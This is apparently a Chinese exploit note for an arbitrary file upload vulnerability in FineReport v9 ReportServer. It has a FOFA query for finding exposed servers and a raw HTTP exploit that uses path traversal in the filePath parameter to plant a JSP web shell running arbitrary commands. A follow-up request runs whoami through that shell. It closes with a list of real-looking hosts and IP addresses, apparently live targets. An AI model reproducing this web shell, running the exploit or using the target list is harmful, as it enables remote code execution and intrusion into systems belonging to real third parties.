# 帆软 v9 ReportServer 报表软件 ReportServer文件 filePath 参数文件上传漏洞

    ## fofa

```
app="帆软-FineReport"
```



## exp

```
POST /WebReport/ReportServer HTTP/1.1
Host: 119.84.139.156:81
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/json
Accept-Encoding: gzip
Content-Length: 317

{"__CONTENT__":"<%java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream();int a = -1;byte[] b = new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}%>","cmd":"design_save_svg","op":"svginit","filePath":"httpchartmapsvg/../../../log.svgCBed467BfbeB1caF.jsp"}
```

```
GET /WebReport/log.svgCBed467BfbeB1caF.jsp?cmd=whoami HTTP/1.1
Host: 119.84.139.156:81
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip


```

```
report.elementwin.com:80
https://report.elementwin.com
117.27.235.72:9009
118.190.78.32:8080
119.84.139.156:81
https://122.114.167.82
122.114.167.82:80
122.224.56.147:8081
122.224.56.147:80
https://122.224.56.147
221.12.118.171:8081
hy.lngkic.com:80
```
